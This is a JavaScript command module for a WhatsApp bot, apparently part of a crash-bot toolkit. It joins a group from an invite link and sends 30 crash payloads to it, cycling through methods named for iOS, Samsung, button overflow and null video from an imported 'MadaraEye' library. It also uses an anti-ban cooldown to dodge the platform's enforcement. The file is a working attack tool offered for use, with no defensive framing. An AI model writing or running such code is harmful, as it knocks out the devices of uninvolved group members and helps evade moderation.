'use strict';
const { MadaraEye } = require('../../lib/madaraEye');
const { createProgressBar } = require('../../lib/progressBar');
const { canCrash, recordCrash } = require('../../lib/antiBan');

module.exports = {
    name: 'groupcrash',
    aliases: ['gcrash', 'crashgroup', 'gclink', 'groupkill', 'nuke', 'gc', 'eyenuke'],
    category: 'madaraeye',
    desc: 'ᴍᴀᴅᴀʀᴀ ᴇʏᴇ — ɢʀᴏᴜᴘ ɴᴜᴋᴇ',
    usage: '.groupcrash <group_link>',
    waitReact: true,

    async execute(sock, msg, args, ctx) {
        const s = ctx.settings;
        const prefix = s.prefix || '.';
        const phone = sock._sessionPhone || sock.user?.id?.split(':')[0] || 'default';

        if (!args[0]) {
            return sock.sendMessage(ctx.from, { text: `❌ *ᴡʀᴏɴɢ ᴜsᴀɢᴇ*\n\n📌 *Usage:* ${prefix}groupcrash <group_link>` }, { quoted: msg });
        }

        let inviteCode = args[0];
        if (inviteCode.includes('/')) inviteCode = inviteCode.split('/').pop();
        if (inviteCode.includes('?')) inviteCode = inviteCode.split('?')[0];
        inviteCode = inviteCode.trim();

        let eye = global.getMadaraEye?.(sock) || new MadaraEye(sock);

        try {
            await sock.sendMessage(ctx.from, { text: '🔍 ʀᴇsᴏʟᴠɪɴɢ ɢʀᴏᴜᴘ...' }, { quoted: msg });

            let groupJid = null;
            try {
                groupJid = await sock.groupAcceptInvite(inviteCode);
            } catch {
                try {
                    const info = await sock.groupGetInviteInfo(inviteCode);
                    if (info?.id) groupJid = info.id;
                } catch {}
            }

            if (!groupJid) throw new Error('Could not resolve group');

            await sock.sendMessage(ctx.from, { text: `🎯 ɢʀᴏᴜᴘ ғᴏᴜɴᴅ: ${groupJid}\n💣 ɴᴜᴋᴇ ɪɴɪᴛɪᴀᴛᴇᴅ...` }, { quoted: msg });

            const TOTAL = 30;
            const bar = createProgressBar(sock, ctx.from, TOTAL, msg);
            await bar.init('ɴᴜᴋᴇ sᴛᴀʀᴛɪɴɢ...');

            const methods = ['iosInvisibleForce', 'samsung', 'buttonOverflow', 'vidxNull'];

            for (let i = 0; i < TOTAL; i++) {
                let allowed = false;
                while (!allowed) {
                    try {
                        await canCrash(phone);
                        allowed = true;
                    } catch (e) {
                        const waitMatch = e.message.match(/(\d+)s/);
                        const waitSec = waitMatch ? parseInt(waitMatch[1]) : 30;
                        await bar.setPhase(`⏳ ${e.message}`);
                        const chunks = Math.ceil(waitSec / 5);
                        for (let c = 0; c < chunks; c++) {
                            await new Promise(r => setTimeout(r, 5000));
                            const remaining = Math.max(0, waitSec - (c + 1) * 5);
                            await bar.setPhase(`⏳ ᴄᴏᴏʟᴅᴏᴡɴ: ${remaining}s ʀᴇᴍᴀɪɴɪɴɢ`);
                        }
                    }
                }

                const method = methods[i % methods.length];
                await eye[method](groupJid);
                await recordCrash(phone);
                await bar.update(1, method);
            }

            await bar.done(`✅ ɢʀᴏᴜᴘ ɴᴜᴋᴇ ᴄᴏᴍᴘʟᴇᴛᴇ\n📊 ${TOTAL} ᴘᴀʏʟᴏᴀᴅs\n🎯 ${groupJid}`);
        } catch (e) {
            return sock.sendMessage(ctx.from, { text: '❌ ᴇʀʀᴏʀ: ' + e.message }, { quoted: msg });
        }
    }
};